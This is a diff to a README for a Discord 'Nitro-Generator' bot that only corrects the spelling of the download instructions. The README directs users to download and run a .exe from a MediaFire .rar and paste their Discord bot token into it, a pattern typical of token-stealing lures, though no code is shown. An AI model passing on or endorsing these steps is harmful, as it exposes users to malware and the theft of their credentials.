@@ -9,8 +9,8 @@ The best and the easiest nitro generator.
 #### **Discord bot Token**.
 # Installation
 ### There is `Four` ways to install the `Nitro-Generator` .
-### Way number One is Downloading the .exe file from --> [Downlode](https://www.mediafire.com/file/ol3j4cw6cvdyis5/NGB-D_Setup.rar/file).
-#### after Downlodeing the file Run it and fill in the blanks and when the **Token title** pupup Type the **Discord Bot token** and **press enter** in your keyboard and the bot will start. Enjoy✨
+### Way number One is Downloading the .exe file from --> [Downlod](https://www.mediafire.com/file/ol3j4cw6cvdyis5/NGB-D_Setup.rar/file).
+#### after Downloding the file Run it and fill in the blanks and when the **Token title** pupup Type the **Discord Bot token** and **press enter** in your keyboard and the bot will start. Enjoy✨
 ![App Screenshot](https://i.ibb.co/jHb573N/Screenshot-1.png)
 ----------------------------
 ## Way number Two **`cloning`**
